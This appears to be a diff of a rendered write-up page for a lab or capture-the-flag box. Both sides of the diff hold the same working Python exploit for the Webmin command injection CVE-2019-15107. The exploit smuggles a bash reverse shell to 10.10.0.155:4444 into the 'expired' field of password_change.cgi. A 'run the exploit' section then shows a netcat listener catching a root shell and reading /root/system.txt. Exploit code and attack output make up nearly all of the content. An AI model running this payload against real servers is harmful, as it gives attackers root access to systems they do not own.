+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>FLAG<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;f3a0c13c3765137bcde68572707ae5c0&#34;</span>
-</span></span><span style="display:flex;"><span>URI<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://127.0.0.1:10000&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>RHOST<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;10.10.0.155&#34;</span>
-</span></span><span style="display:flex;"><span>RPORT<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4444</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>CMD<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;id&#34;</span>
-</span></span><span style="display:flex;"><span>CMD<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/</span><span style="color:#f1fa8c">{</span>RHOST<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/</span><span style="color:#f1fa8c">{</span>RPORT<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;&amp;1&#39;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Testing for RCE (CVE-2019-15107) on </span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">: &#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;user&#39;</span>: <span style="color:#f1fa8c">&#39;root&#39;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;pam&#39;</span>:  <span style="color:#f1fa8c">&#39;&#39;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;expired&#39;</span>:<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;2|echo </span><span style="color:#f1fa8c">{</span>FLAG<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">;</span><span style="color:#f1fa8c">{</span>CMD<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">;echo </span><span style="color:#f1fa8c">{</span>FLAG<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># &#39;old&#39;:  f&#34;id|echo {FLAG}&#34;,</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># &#39;old&#39;:  f&#34;id|ifconfig&#34;,</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># &#39;new1&#39;: &#39;root&#39;,</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># &#39;new2&#39;: &#39;root&#39;,</span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;Content-Type&#39;</span>: <span style="color:#f1fa8c">&#39;application/x-www-form-urlencoded&#39;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;Cookie&#39;</span>: <span style="color:#f1fa8c">&#39;redirect=1; testing=1; sid=x; sessiontest=1&#39;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/session_login.cgi&#34;</span>,
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/password_change.cgi&#34;</span>, params<span style="color:#ff79c6">=</span>payload, headers<span style="color:#ff79c6">=</span>header)
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>text)
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
+
+FLAG<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;f3a0c13c3765137bcde68572707ae5c0&#34;</span>
+URI<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://127.0.0.1:10000&#34;</span>;
+
+RHOST<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;10.10.0.155&#34;</span>
+RPORT<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4444</span>
+
+CMD<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;id&#34;</span>
+CMD<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/</span><span style="color:#f1fa8c">{</span>RHOST<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/</span><span style="color:#f1fa8c">{</span>RPORT<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;&amp;1&#39;&#34;</span>
+
+<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Testing for RCE (CVE-2019-15107) on </span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">: &#34;</span>)
+
+payload <span style="color:#ff79c6">=</span> {
+        <span style="color:#f1fa8c">&#39;user&#39;</span>: <span style="color:#f1fa8c">&#39;root&#39;</span>,
+        <span style="color:#f1fa8c">&#39;pam&#39;</span>:  <span style="color:#f1fa8c">&#39;&#39;</span>,
+        <span style="color:#f1fa8c">&#39;expired&#39;</span>:<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;2|echo </span><span style="color:#f1fa8c">{</span>FLAG<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">;</span><span style="color:#f1fa8c">{</span>CMD<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">;echo </span><span style="color:#f1fa8c">{</span>FLAG<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>,
+        <span style="color:#6272a4"># &#39;old&#39;:  f&#34;id|echo {FLAG}&#34;,</span>
+        <span style="color:#6272a4"># &#39;old&#39;:  f&#34;id|ifconfig&#34;,</span>
+        <span style="color:#6272a4"># &#39;new1&#39;: &#39;root&#39;,</span>
+        <span style="color:#6272a4"># &#39;new2&#39;: &#39;root&#39;,</span>
+}
+header <span style="color:#ff79c6">=</span> {
+    <span style="color:#f1fa8c">&#39;Content-Type&#39;</span>: <span style="color:#f1fa8c">&#39;application/x-www-form-urlencoded&#39;</span>,
+    <span style="color:#f1fa8c">&#39;Cookie&#39;</span>: <span style="color:#f1fa8c">&#39;redirect=1; testing=1; sid=x; sessiontest=1&#39;</span>,
+    <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/session_login.cgi&#34;</span>,
+}
+
+r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>URI<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/password_change.cgi&#34;</span>, params<span style="color:#ff79c6">=</span>payload, headers<span style="color:#ff79c6">=</span>header)
+<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>text)
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="run-the-exploit">run the exploit</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 webmin1890.py
-</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────
-</span></span><span style="display:flex;"><span>nc -lnvp <span style="color:#bd93f9">444</span>
-</span></span><span style="display:flex;"><span>Connection from 172.31.3.1:54120
-</span></span><span style="display:flex;"><span>bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>1067<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
-</span></span><span style="display:flex;"><span>bash: no job control in this shell
-</span></span><span style="display:flex;"><span>root@office:/usr/share/webmin/# <span style="color:#8be9fd;font-style:italic">cd</span> /root
-</span></span><span style="display:flex;"><span>root@office:~# cat system.txt
-</span></span><span style="display:flex;"><span>39b***********
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 webmin1890.py
+──────────────────────────────────────────────────────────
+nc -lnvp <span style="color:#bd93f9">444</span>
+Connection from 172.31.3.1:54120
+bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>1067<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
+bash: no job control in this shell
+root@office:/usr/share/webmin/# <span style="color:#8be9fd;font-style:italic">cd</span> /root
+root@office:~# cat system.txt
+39b***********
+</code></pre></td></tr></table>
 </div>
 </div>
       </div>
